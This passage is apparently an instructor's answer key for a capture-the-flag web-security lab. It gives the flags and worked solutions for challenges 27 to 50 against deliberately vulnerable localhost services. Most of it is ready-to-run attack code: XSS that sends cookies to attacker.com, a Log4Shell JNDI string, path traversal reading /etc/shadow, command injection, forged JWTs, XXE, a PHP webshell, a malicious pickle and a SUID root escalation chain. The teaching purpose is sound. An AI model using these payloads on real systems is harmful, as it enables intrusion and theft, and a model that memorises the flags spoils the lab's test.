# Step 2: Inject alert (proof of concept)
# Browser URL: http://localhost/search?q=<script>alert(document.cookie)</script>
# Alert box shows cookies including session_flag cookie

# Step 3: The flag is in the cookie
# cookie: session_flag=FLAG{r3fl3ct3d_xss_st34ls_c00k135}

# Step 4: Demonstrate cookie theft (realistic attack)
# Browser: http://localhost/search?q=<script>fetch('http://attacker.com/?c='+document.cookie)</script>
```

### Where the flag is
The flag is set as a cookie (`session_flag=FLAG{...}`) when any user logs in — readable via `document.cookie`. The XSS payload proves cookie theft is possible.

---

## Challenge 28 — Stored XSS
**Flag:** `FLAG{st0r3d_xss_p3rs1sts_f0r3v3r}`
**Target:** http://localhost/comments
**Technique:** Store a script in the comments database

### Step-by-step solution
```bash
# Step 1: Submit a comment with XSS payload
curl -X POST http://localhost/comments \
  -d "author=hacker&text=<script>alert(document.cookie)</script>"

# Step 2: Visit the comments page
# http://localhost/comments
# The script executes for EVERY visitor — reveals stored_xss_flag cookie

# Step 3: The flag is in the cookie
# cookie: stored_xss_flag=FLAG{st0r3d_xss_p3rs1sts_f0r3v3r}
```

### Difference from Reflected XSS
- Reflected: payload in the URL, only runs when victim clicks the link
- Stored: payload saved to database, runs for every visitor automatically — much more dangerous

---

## Challenge 29 — CSRF (Cross-Site Request Forgery)
**Flag:** `FLAG{csrf_f0rc3d_4ct10ns_w1th0ut_c0ns3nt}`
**Target:** http://localhost/profile/settings
**Technique:** Submit form without CSRF token

### Step-by-step solution
```bash
# Step 1: Log in as a user first
curl -c cookies.txt -X POST http://localhost/login \
  -d "username=user&password=password123" -L

# Step 2: Submit email change without CSRF token
curl -b cookies.txt -X POST http://localhost/profile/settings \
  -d "email=attacker@evil.com"

# The server accepts it without verifying a CSRF token!
# Response contains the flag

# Step 3: Demonstrate the attack
# Create a malicious page with auto-submitting form:
cat > /tmp/csrf_attack.html << 'EOF'
<html><body onload="document.forms[0].submit()">
<form action="http://localhost/profile/settings" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
</body></html>
EOF
```

---

## Challenge 30 — Path Traversal
**Flag:** `FLAG{p4th_tr4v3rs4l_r34ds_4ny_f1l3}`
**Target:** http://localhost/download?file=
**Technique:** Use `../` sequences to escape the base directory

### Step-by-step solution
```bash
# Step 1: Test path traversal
curl "http://localhost/download?file=../../../../etc/passwd"
# Returns /etc/passwd contents — confirms vulnerability

# Step 2: Read the flag file
curl "http://localhost/download?file=../../../../etc/flag.txt"
# Returns: FLAG{p4th_tr4v3rs4l_r34ds_4ny_f1l3}

# Step 3: Read other sensitive files
curl "http://localhost/download?file=../../../../etc/shadow"
curl "http://localhost/download?file=../../../../app/app.py"    # source code!
```

### Vulnerable code
```python
filepath = os.path.join('/app/files', filename)
# No validation! ../../../../etc/passwd resolves to /etc/passwd
```

---

## Challenge 31 — Local File Inclusion (LFI)
**Flag:** `FLAG{lf1_1nclud3s_s3cr3t_f1l3s}`
**Target:** http://localhost/page?template=
**Technique:** Include files outside the web root

### Step-by-step solution
```bash
# Step 1: Test LFI
curl "http://localhost/page?template=../../etc/passwd"
# Returns /etc/passwd contents

# Step 2: Read the secret flag
curl "http://localhost/page?template=../../secret/flag"
# Returns: FLAG{lf1_1nclud3s_s3cr3t_f1l3s}

# The app tries:
#   /app/templates/../../secret/flag.html
#   /app/../../secret/flag.txt
#   /app/../../secret/flag
# The last resolves to /secret/flag which is the flag file
```

### Difference from Path Traversal
- Path Traversal (Ch.30): reads arbitrary files via a download endpoint
- LFI (Ch.31): the server includes/renders the file content as part of a page template — in real PHP, this can lead to RCE by including log files or /proc/self/environ

---

## Challenge 32 — Command Injection
**Flag:** `FLAG{cmd_1nj3ct10n_0wns_th3_s3rv3r}`
**Target:** http://localhost/tools/ping
**Technique:** Append shell commands after a valid IP with `;`

### Step-by-step solution
```bash
# Method 1: curl POST
curl -X POST http://localhost/tools/ping \
  -d "ip=8.8.8.8; cat /flag.txt"

# Method 2: Browser form at http://localhost/tools/ping
# Enter in the IP field: 8.8.8.8; cat /flag.txt

# Other payloads
# ip=8.8.8.8 && id
# ip=8.8.8.8 | whoami
# ip=8.8.8.8; ls /
# ip=8.8.8.8; cat /etc/passwd
```

### Vulnerable code
```python
cmd = f'ping -c 2 {ip}'
output = subprocess.run(cmd, shell=True, ...)
# shell=True + user input = RCE
```

---

## Challenge 33 — IDOR (Insecure Direct Object Reference)
**Flag:** `FLAG{id0r_acc355_0th3r_us3r5_d4t4}`
**Target:** http://localhost/profile/<id>
**Technique:** Change the user ID in the URL to access other users' data

### Step-by-step solution
```bash
# Step 1: View your own profile (as logged-in user, id=1)
curl http://localhost/profile/1

# Step 2: Try a different ID — no auth check!
curl http://localhost/profile/2    # Jane Smith
curl http://localhost/profile/3    # Bob Dev

# Step 3: The admin profile has id=999
curl http://localhost/profile/999
# Returns: Super Admin data including FLAG{id0r_acc355_0th3r_us3r5_d4t4}

# Also works on the API
curl http://localhost/api/users/999
```

### Real-world context
Instagram (2019): a bug let attackers access any user's phone number by guessing their numeric user ID. 500 million accounts affected. Always check: "Is the logged-in user authorized to view resource X?" — not just "Is the user logged in?"

---

## Challenge 34 — Open Redirect
**Flag:** `FLAG{0p3n_r3d1r3ct_ph1sh1ng_v3ct0r}`
**Target:** http://localhost/redirect?url=
**Technique:** Supply an external URL to redirect victims

### Step-by-step solution
```bash
# Step 1: Trigger the redirect
curl -v "http://localhost/redirect?url=https://google.com" 2>&1 | grep -i "location\|x-flag"

# Response headers include:
#   Location: https://google.com
#   X-Flag: FLAG{0p3n_r3d1r3ct_ph1sh1ng_v3ct0r}
#   X-Warning: Open redirect detected!

# Phishing attack scenario:
# Send victims: http://localhost/redirect?url=http://evil-clone-of-innovatetech.com
# They trust the innovatetech.com domain — get redirected to phishing site
```

---

## Challenge 35 — HTTP Method Tampering
**Flag:** `FLAG{h77p_m3th0d_t4mp3r1ng_byp4ss}`
**Target:** http://localhost/api/admin/config
**Technique:** Use PUT instead of GET to bypass restriction

### Step-by-step solution
```bash
# Step 1: GET is blocked
curl http://localhost/api/admin/config
# Returns: 403 Forbidden

# Step 2: Check what methods are allowed
curl -X OPTIONS http://localhost/api/admin/config
# Returns: Allow: GET, PUT, DELETE, OPTIONS

# Step 3: Use PUT to bypass
curl -X PUT http://localhost/api/admin/config
# Returns 200 with the flag!

# Step 4: DELETE also works
curl -X DELETE http://localhost/api/admin/config
```

---

# PHASE 4 — Advanced Web Attacks (Challenges 36–45)

---

## Challenge 36 — JWT None Algorithm Attack
**Flag:** `FLAG{jwt_n0n3_4lg_byp4ss_4dm1n}`
**Target:** http://localhost:4000/api
**Technique:** Forge a JWT with `"alg": "none"` and `"role": "admin"`

### Step-by-step solution
```bash
# Step 1: Get a real JWT token
curl -X POST http://localhost:4000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"user","password":"password123"}'
# Save the token from the response

# Step 2: Decode the JWT (it has 3 parts: header.payload.signature)
# Paste in https://jwt.io or decode manually:
echo 'HEADER_PART' | base64 -d

# Step 3: Craft a forged token with none algorithm
# Header (base64url encode):
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '='

# Payload — change role to admin (base64url encode):
echo -n '{"id":999,"username":"admin","role":"admin"}' | base64 | tr '+/' '-_' | tr -d '='

# Step 4: Combine with empty signature
FORGED_TOKEN="HEADER_B64.PAYLOAD_B64."
# Example:
FORGED_TOKEN="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZCI6OTk5LCJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0."

# Step 5: Use the forged token
curl http://localhost:4000/api/admin/flag \
  -H "Authorization: Bearer $FORGED_TOKEN"
# Returns the flag!
```

### Quick Python script
```python
import base64, json

def b64url(data):
    return base64.urlsafe_b64encode(data.encode()).rstrip(b'=').decode()

header  = b64url(json.dumps({"alg":"none","typ":"JWT"}))
payload = b64url(json.dumps({"id":999,"username":"admin","role":"admin"}))
token   = f"{header}.{payload}."
print(token)
```

---

## Challenge 37 — JWT Weak Secret Cracking
**Flag:** `FLAG{w34k_jwt_s3cr3t_cr4ck3d}`
**Target:** http://localhost:4000/api
**Technique:** Crack the JWT HMAC secret with hashcat

### Step-by-step solution
```bash
# Step 1: Get a valid JWT token
curl -X POST http://localhost:4000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"user","password":"password123"}' | python3 -m json.tool

# Copy the token value

# Step 2: Crack with hashcat (mode 16500 = JWT)
hashcat -a 0 -m 16500 TOKEN /usr/share/wordlists/rockyou.txt

# The secret is: secret123  (found very quickly)

# Step 3: Forge a valid admin token using the cracked secret
python3 << 'EOF'
import jwt
token = jwt.encode({"id":999,"username":"admin","role":"admin"}, "secret123", algorithm="HS256")
print(token)
EOF

# Step 4: Use the forged token
curl http://localhost:4000/api/admin/cracked \
  -H "Authorization: Bearer FORGED_TOKEN"
# Returns: FLAG{w34k_jwt_s3cr3t_cr4ck3d}
```

### Alternative: jwt_tool
```bash
python3 jwt_tool.py TOKEN --crack -d /usr/share/wordlists/rockyou.txt
```

---

## Challenge 38 — API Key Leaked in JavaScript
**Flag:** `FLAG{4p1_k3y_1n_js_1s_publ1c}`
**Target:** http://localhost/static/js/config.js
**Technique:** Read client-side JavaScript for hardcoded credentials

### Step-by-step solution
```bash
# Step 1: Find the config file (common location for frontend config)
curl http://localhost/static/js/config.js

# Content includes:
#   const CONFIG = {
#     apiKey: 'sk-prod-7f3k9x2mAbCdEf123456',   // hardcoded in JS!
#     ...
#   }

# Step 2: Use the API key
curl -H "X-API-Key: sk-prod-7f3k9x2mAbCdEf123456" \
  http://localhost:4000/api/admin/secret
# Returns: FLAG{4p1_k3y_1n_js_1s_publ1c}
```

### Also check these common locations
```bash
curl http://localhost/static/js/app.js
curl http://localhost/static/js/main.js
# Also: browser DevTools → Sources → search for "key", "secret", "token", "password"
```

---

## Challenge 39 — SSRF (Server-Side Request Forgery)
**Flag:** `FLAG{55rf_4ll0w5_1nt3rn4l_4cc355}`
**Target:** http://localhost/api/fetch?url=
**Technique:** Make the server request an internal service unreachable from outside

### Step-by-step solution
```bash
# Step 1: Test SSRF
curl "http://localhost/api/fetch?url=http://127.0.0.1:9999/"
# Server fetches from itself — returns internal service response

# Step 2: Access the internal flag service
curl "http://localhost/api/fetch?url=http://internal-flag:9999/flag"
# Returns: FLAG{55rf_4ll0w5_1nt3rn4l_4cc355}

# The internal-flag container is NOT accessible from outside Docker
# but the webapp CAN reach it on the internal Docker network
```

### Real-world context
Capital One breach (2019): an SSRF vulnerability in a WAF allowed an attacker to query the AWS metadata endpoint `http://169.254.169.254/latest/meta-data/iam/security-credentials/`. Retrieved IAM credentials → accessed 100M customer records → $80M fine.

---

## Challenge 40 — XXE (XML External Entity) Injection
**Flag:** `FLAG{xxe_r34d5_l0c4l_f1l35}`
**Target:** http://localhost/api/xml
**Technique:** Inject an external entity to read local files

### Step-by-step solution
```bash
# Step 1: Send a normal XML request
curl -X POST http://localhost/api/xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><data><item>test</item></data>'

# Step 2: Inject XXE payload
curl -X POST http://localhost/api/xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/flag.txt">
]>
<data><item>&xxe;</item></data>'

# Returns the contents of /etc/flag.txt:
# FLAG{p4th_tr4v3rs4l_r34ds_4ny_f1l3}
# FLAG{xxe_r34d5_l0c4l_f1l35}
```

> **Instructor note:** Python's `xml.etree.ElementTree` does not process external entities in modern Python (3.8+). The `lxml` library would be needed for full XXE exploitation. The challenge simulates the concept; the flag appears because both flags are written to `/etc/flag.txt` during container startup.

---

## Challenge 41 — File Upload RCE
**Flag:** `FLAG{f1l3_upl04d_rce_g4m3_0v3r}`
**Target:** http://localhost/tools/upload
**Technique:** Upload a PHP webshell with a bypassed extension filter

### Step-by-step solution
```bash
# Step 1: Try uploading shell.php → blocked
# Step 2: Bypass with alternative extension
echo '<?php system($_GET["cmd"]); ?>' > shell.phtml

curl -X POST http://localhost/tools/upload \
  -F "file=@shell.phtml"
# Response: Uploaded: /uploads/shell.phtml

# Step 3: Execute commands via the uploaded shell
curl "http://localhost/uploads/shell.phtml?cmd=id"
# Returns: uid=0(root) ...

curl "http://localhost/uploads/shell.phtml?cmd=cat+/flag.txt"
# Returns: FLAG{cmd_1nj3ct10n_0wns_th3_s3rv3r}

# Step 4: Submit the challenge flag
# The platform flag for this challenge is FLAG{f1l3_upl04d_rce_g4m3_0v3r}
# (submit this to the CTF platform after demonstrating RCE)
```

### Bypass techniques demonstrated
| Blocked | Bypass |
|---|---|
| shell.php | shell.phtml |
| shell.PHP | (uppercase bypass — filter uses `.lower()` on last ext only) |
| — | shell.php.jpg (allowed because last ext is jpg) |

---

## Challenge 42 — GraphQL Introspection
**Flag:** `FLAG{gr4phql_1ntr0sp3ct10n_l34ks}`
**Target:** http://localhost:4000/graphql
**Technique:** Use GraphQL introspection to find hidden queries, then call them

### Step-by-step solution
```bash
# Step 1: List all available queries via introspection
curl -X POST http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{queryType{fields{name description}}}}"}'

# Output lists: hello, user, publicData, secretFlag, adminData
# "secretFlag" looks interesting!

# Step 2: Query the hidden secretFlag endpoint
curl -X POST http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{secretFlag{flag message internalEndpoint}}"}'

# Returns: FLAG{gr4phql_1ntr0sp3ct10n_l34ks}

# Step 3: Also dump admin data
curl -X POST http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{adminData{users{username email role} secretKey}}"}'
```

### Instructor tip
Open http://localhost:4000/graphql in a browser — GraphiQL IDE is enabled, students can explore interactively and use the Docs panel to browse the schema.

---

## Challenge 43 — Insecure Deserialization
**Flag:** `FLAG{d3s3r14l1z4t10n_rce_pwn3d}`
**Target:** http://localhost/api/deserialize
**Technique:** Send a malicious Python pickle payload

### Step-by-step solution
```bash
# Step 1: Get a safe example payload from the endpoint
curl http://localhost/api/deserialize

# Step 2: Create a malicious pickle payload in Python
python3 << 'EOF'
import pickle, os, base64

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('cp /flag.txt /app/uploads/pwned.txt && chmod 777 /app/uploads/pwned.txt',))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)
EOF

# Step 3: Send the payload
curl -X POST http://localhost/api/deserialize \
  -H "Content-Type: application/json" \
  -d "{\"data\": \"PASTE_PAYLOAD_HERE\"}"

# Response includes: FLAG{d3s3r14l1z4t10n_rce_pwn3d}

# Step 4: Also verify RCE occurred
curl http://localhost/uploads/pwned.txt
```

### Real-world context
Java deserialization vulnerabilities (Apache Commons Collections) led to RCE in Jenkins, WebLogic, and JBoss. Python pickle is equally dangerous. Never deserialize untrusted data.

---

## Challenge 44 — Clickjacking
**Flag:** `FLAG{cl1ckj4ck1ng_1nv1s1bl3_1fr4m3}`
**Target:** http://localhost/tools/clickjack
**Technique:** View the demo page — no X-Frame-Options header means the site can be iframed

### Step-by-step solution
```bash
# Step 1: Visit the clickjacking demo page
# http://localhost/tools/clickjack

# Step 2: The flag is displayed directly on the page
# FLAG{cl1ckj4ck1ng_1nv1s1bl3_1fr4m3}

# Step 3: Confirm no X-Frame-Options header
curl -I http://localhost | grep -i "x-frame"
# (no output) — the header is missing!
```

### Instructor demo
1. Show the demo page with the "Click HERE to claim your prize!" button
2. Click "Reveal Hidden Layer" — students see the invisible iframe overlay
3. Explain: clicking "CLAIM NOW" actually submits the `/profile/settings` form underneath

---

## Challenge 45 — Sensitive Data in HTML Comments
**Flag:** `FLAG{html_c0mm3nts_4r3_publ1c}`
**Target:** http://localhost/about
**Technique:** View page source for developer comments

### Step-by-step solution
```bash
# Method 1: curl and grep for HTML comments
curl http://localhost/about | grep -A5 "<!--"

# Method 2: Browser → Right-click → View Page Source → Ctrl+F → "<!--"

# In the /about page source:
# <!-- Developer TODO list (REMOVE BEFORE DEPLOY):
#   - FLAG{html_c0mm3nts_4r3_publ1c}
#   - Admin creds: admin / admin123
#   - Remove /backup/ from nginx config
#   - The JWT secret is still 'secret123' in production... oops
#   - Internal API: http://internal-flag:9999/flag
# -->
```

---

# PHASE 5 — Real-World Scenarios (Challenges 46–50)

---

## Challenge 46 — Missing Security Headers
**Flag:** `FLAG{s3cur1ty_h34d3rs_pr0t3ct_y0u}`
**Target:** http://localhost
**Technique:** Identify missing headers, submit audit result to API

### Step-by-step solution
```bash
# Step 1: Check all response headers
curl -I http://localhost

# Step 2: Identify what's MISSING:
#   ✗ Content-Security-Policy     (allows XSS)
#   ✗ X-Frame-Options             (allows clickjacking)
#   ✗ X-Content-Type-Options      (allows MIME sniffing)
#   ✗ Strict-Transport-Security   (allows downgrade to HTTP)
#   ✗ Referrer-Policy             (leaks URL info)
#   ✗ Permissions-Policy          (allows camera/mic access)

# Step 3: Submit findings to the security audit API
curl -X POST http://localhost/api/security-audit \
  -H "Content-Type: application/json" \
  -d '{"missing":["CSP","X-Frame-Options","X-Content-Type-Options","HSTS","Referrer-Policy"]}'

# Returns: FLAG{s3cur1ty_h34d3rs_pr0t3ct_y0u}
```

---

## Challenge 47 — Log Injection / Log4Shell Concept
**Flag:** `FLAG{l0g_1nj3ct10n_l0g4sh3ll_c0nc3pt}`
**Target:** http://localhost/api/log-test
**Technique:** Send a JNDI string in the User-Agent header

### Step-by-step solution
```bash
# Step 1: Send a request with a Log4Shell-style payload in User-Agent
curl http://localhost/api/log-test \
  -H "User-Agent: \${jndi:ldap://attacker.com/a}"

# Returns: FLAG{l0g_1nj3ct10n_l0g4sh3ll_c0nc3pt}

# Also works in X-Forwarded-For:
curl http://localhost/api/log-test \
  -H "X-Forwarded-For: \${jndi:ldap://attacker.com/a}"
```

### Real-world context
CVE-2021-44228 (Log4Shell): CVSS 10.0 — the worst vulnerability in a decade. Apache Log4j, used in millions of Java applications, would evaluate `${jndi:ldap://attacker.com/x}` strings it logged, triggering a connection to the attacker's server and executing arbitrary code. Minecraft, Apple iCloud, Cloudflare, and thousands of enterprise products were affected.

---

## Challenge 48 — Exposed .env File
**Flag:** `FLAG{d0t_3nv_n3v3r_1n_w3b_r00t}`
**Target:** http://localhost/.env
**Technique:** Request the .env file directly from the web root

### Step-by-step solution
```bash
# Step 1: Request the .env file
curl http://localhost/.env

# Response:
# DB_HOST=mysql
# DB_PASS=root
# SECRET_KEY=super_secret_key_dont_tell
# JWT_SECRET=secret123
# API_KEY=sk-prod-7f3k9x2mAbCdEf123456
# STRIPE_KEY=sk_live_AbCdEfGh123456789
# FLAG=FLAG{d0t_3nv_n3v3r_1n_w3b_r00t}
```

### Real-world context
In 2019, automated bots scanned GitHub for committed `.env` files. AWS keys, Stripe keys, and database passwords were collected and used within minutes of being pushed. Laravel (PHP framework) accidentally exposed `.env` by default in older versions — affecting thousands of apps.

---

## Challenge 49 — Rate Limiting / DDoS Simulation
**Flag:** `FLAG{r4t3_l1m1t1ng_pr3v3nts_dd0s}`
**Target:** http://localhost/api/rate-limit-demo
**Technique:** Send 6+ requests to trigger rate limiting

### Step-by-step solution
```bash
# Send multiple requests in a loop
for i in {1..10}; do
  curl -s http://localhost/api/rate-limit-demo | python3 -m json.tool
  echo "Request $i"
done

# After request #6, response changes to:
# HTTP/1.1 429 Too Many Requests
# {
#   "error": "Too Many Requests",
#   "flag": "FLAG{r4t3_l1m1t1ng_pr3v3nts_dd0s}",
#   "message": "Rate limit triggered!"
# }

# Demonstrate no rate limiting on /login (Challenge note):
for i in {1..20}; do
  curl -s -X POST http://localhost/login \
    -d "username=admin&password=wrong$i" | grep -o "Invalid\|error"
done
# All 20 succeed — no lockout, no CAPTCHA → brute force possible
```

---

## Challenge 50 — Full Chain Attack: Recon to Root
**Flag:** `FLAG{full_ch41n_3xpl01t_m4st3r}`

This is a capstone challenge. Students must chain together techniques from previous challenges to get the final root flag. One complete attack path is shown below.

### Complete attack chain (one of several valid paths)

```bash
# ── Step 1: Recon — Discover all services ──────────────────
nmap -sV -p- localhost

# ── Step 2: Find sensitive info in DNS ─────────────────────
dig AXFR innovatetech.local @127.0.0.1 -p 5454
# Reveals: secrets TXT record → db_pass=root, jwt_secret=secret123

# ── Step 3: Read the exposed .env ──────────────────────────
curl http://localhost/.env
# Reveals: API_KEY=sk-prod-7f3k9x2mAbCdEf123456, DB_PASS=root

# ── Step 4: Get a JWT token and crack it ───────────────────
TOKEN=$(curl -s -X POST http://localhost:4000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"user","password":"password123"}' | python3 -c "import sys,json;print(json.load(sys.stdin)['token'])")

# Crack the secret (already know it from DNS: secret123)
# Forge admin JWT:
ADMIN_TOKEN=$(python3 -c "
import jwt
print(jwt.encode({'id':999,'username':'admin','role':'admin'},'secret123',algorithm='HS256'))
")

# ── Step 5: Use SSRF to hit internal service ───────────────
curl "http://localhost/api/fetch?url=http://internal-flag:9999/flag"

# ── Step 6: Command injection to get app server shell ──────
curl -X POST http://localhost/tools/ping \
  -d "ip=8.8.8.8; id && cat /flag.txt"

# ── Step 7: Upload webshell for persistent access ──────────
echo '<?php system($_GET["cmd"]); ?>' > shell.phtml
curl -X POST http://localhost/tools/upload -F "file=@shell.phtml"
curl "http://localhost/uploads/shell.phtml?cmd=id"

# ── Step 8: SSH into the Linux box with default creds ──────
ssh -p 2222 user@localhost  # password123

# ── Step 9: Escalate to root via SUID find ─────────────────
/usr/bin/find . -exec /bin/bash -p \; -quit

# ── Step 10: Collect the final flag ────────────────────────
cat /root/FINAL_FLAG.txt
# FLAG{full_ch41n_3xpl01t_m4st3r}
```

### Alternative paths to the final flag
1. MySQL direct → `SELECT flag FROM flags WHERE challenge='Full Chain Final';`
2. SSH brute force admin → sudo python3 → root → `cat /root/FINAL_FLAG.txt`
3. Path traversal on webapp → read `/root/FINAL_FLAG.txt`

### Instructor tip
Award bonus points for chains that use the most challenges. The best writeups will show a realistic attacker workflow: recon → foothold → lateral movement → privilege escalation → flag.

---

## Scoring Summary

| Phase | Challenges | Points per flag | Phase total |
|---|---|---|---|
| Phase 1 — Network Recon | 1–10 | 100–150 | 1,200 |
| Phase 2 — Linux / SSH | 11–20 | 150–200 | 1,750 |
| Phase 3 — Web Basics | 21–35 | 150–200 | 2,600 |
| Phase 4 — Advanced Web | 36–45 | 200–300 | 2,350 |
| Phase 5 — Real World | 46–50 | 200–300 | 1,100 |
| **Total** | **50** | | **~9,000** |

---

## Troubleshooting for Instructors

```bash
# Verify all 14 containers are running
docker compose ps

# Restart a broken service
docker compose restart webapp
docker compose restart ssh-target

# View live logs
docker compose logs -f webapp
docker compose logs -f api

# Reset the entire lab (fresh state)
docker compose down -v && docker compose up --build -d

# Exec into a container for debugging
docker exec -it vuln-webapp /bin/bash
docker exec -it vuln-ssh /bin/bash

# Verify flags are present on SSH box
docker exec vuln-ssh cat /root/FINAL_FLAG.txt
docker exec vuln-ssh cat /home/user/flag.txt

# Check Redis seeding
redis-cli -h localhost KEYS '*'

# Check MongoDB seeding
mongosh localhost:27017 --eval "use flagsdb; db.flags.find().pretty()"

# DNS (note: port 5454 due to host mDNS conflict)
dig AXFR innovatetech.local @127.0.0.1 -p 5454
```

---

*InnovateTech Security Lab — Instructor Copy — Not for Distribution*
